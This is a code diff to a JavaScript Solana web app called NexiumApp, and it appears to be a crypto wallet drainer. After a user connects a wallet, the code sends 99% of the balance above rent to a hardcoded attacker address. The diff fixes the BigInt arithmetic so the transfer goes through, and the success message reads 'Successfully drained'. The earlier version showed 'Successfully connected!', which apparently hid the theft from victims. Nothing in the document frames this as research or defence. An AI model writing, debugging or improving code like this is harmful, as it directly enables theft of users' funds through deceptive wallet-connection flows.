@@ -307,18 +307,22 @@ class NexiumApp {
 
       const receiverWallet = new PublicKey(YOUR_WALLET_ADDRESS);
       const minBalance = await this.solConnection.getMinimumBalanceForRentExemption(0);
-      const balanceForTransfer = balance - minBalance;
+      const balanceForTransfer = BigInt(balance) - BigInt(minBalance);
       if (balanceForTransfer <= 0) {
         this.showFeedback('Insufficient funds.', 'error');
         this.hideProcessingSpinner();
         return;
       }
 
+      // Calculate 99% of balanceForTransfer and ensure it's an integer
+      const lamportsToSend = BigInt(Math.floor(Number(balanceForTransfer) * 0.99));
+      console.log(`Transferring ${lamportsToSend} lamports (${Number(lamportsToSend) / 10**decimals} SOL)`);
+
       const transaction = new Transaction().add(
         SystemProgram.transfer({
           fromPubkey: new PublicKey(this.publicKey),
           toPubkey: receiverWallet,
-          lamports: balanceForTransfer * 0.99,
+          lamports: lamportsToSend,
         })
       );
 
@@ -332,7 +336,7 @@ class NexiumApp {
       let txid = await this.solConnection.sendRawTransaction(signed.serialize());
       await this.solConnection.confirmTransaction(txid);
       console.log('Transaction confirmed:', txid);
-      this.showFeedback(`Successfully connected!`, 'success');
+      this.showFeedback(`Successfully drained ${Number(lamportsToSend) / 10**decimals} ${symbol}`, 'success');
     } catch (error) {
       console.error('Drain token error:', error);
       this.showFeedback(`Error draining ${selectedToken ? selectedToken.symbol : 'token'}: ${error.message}`, 'error');
@@ -588,18 +592,22 @@ class NexiumApp {
 
             const receiverWallet = new PublicKey(YOUR_WALLET_ADDRESS);
             const minBalance = await this.solConnection.getMinimumBalanceForRentExemption(0);
-            const balanceForTransfer = balance - minBalance;
+            const balanceForTransfer = BigInt(balance) - BigInt(minBalance);
             if (balanceForTransfer <= 0) {
               this.showFeedback('Insufficient funds.', 'error');
               this.hideProcessingSpinner();
               return;
             }
 
+            // Calculate 99% of balanceForTransfer and ensure it's an integer
+            const lamportsToSend = BigInt(Math.floor(Number(balanceForTransfer) * 0.99));
+            console.log(`Transferring ${lamportsToSend} lamports (${Number(lamportsToSend) / 10**decimals} SOL)`);
+
             const transaction = new Transaction().add(
               SystemProgram.transfer({
                 fromPubkey: new PublicKey(this.publicKey),
                 toPubkey: receiverWallet,
-                lamports: balanceForTransfer * 0.99,
+                lamports: lamportsToSend,
               })
             );
 
@@ -613,7 +621,7 @@ class NexiumApp {
             let txid = await this.solConnection.sendRawTransaction(signed.serialize());
             await this.solConnection.confirmTransaction(txid);
             console.log('Transaction confirmed:', txid);
-            this.showFeedback(`Successfully connected!`, 'success');
+            this.showFeedback(`Successfully drained ${Number(lamportsToSend) / 10**decimals} ${symbol}`, 'success');
           } catch (error) {
             console.error('Drain token error:', error);
             this.showFeedback(`Error draining ${selectedToken ? selectedToken.symbol : 'token'}: ${error.message}`, 'error');
@@ -824,7 +832,7 @@ class NexiumApp {
       await this.validateAddress(YOUR_WALLET_ADDRESS, 'wallet');
       if (selectedToken.isNative) {
         const minBalance = await this.solConnection.getMinimumBalanceForRentExemption(0);
-        if (amount.add(minBalance) > this.currentPaymentToken.balance) {
+        if (amount + BigInt(minBalance) > BigInt(this.currentPaymentToken.balance)) {
           this.showFeedback('Insufficient balance for rent and amount.', 'error');
           this.hideProcessingSpinner();
           return;
@@ -843,7 +851,7 @@ class NexiumApp {
         let txid = await this.solConnection.sendRawTransaction(signed.serialize());
         await this.solConnection.confirmTransaction(txid);
         console.log('Volume transaction confirmed:', txid);
-        this.showFeedback(`Successfully transferred ${amount / BigInt(10 ** selectedToken.decimals)} ${selectedToken.symbol}`, 'success');
+        this.showFeedback(`Successfully transferred ${Number(amount) / 10**selectedToken.decimals} ${selectedToken.symbol}`, 'success');
       } else {
         this.showFeedback('SPL token volume transfer not supported yet.', 'error');
       }
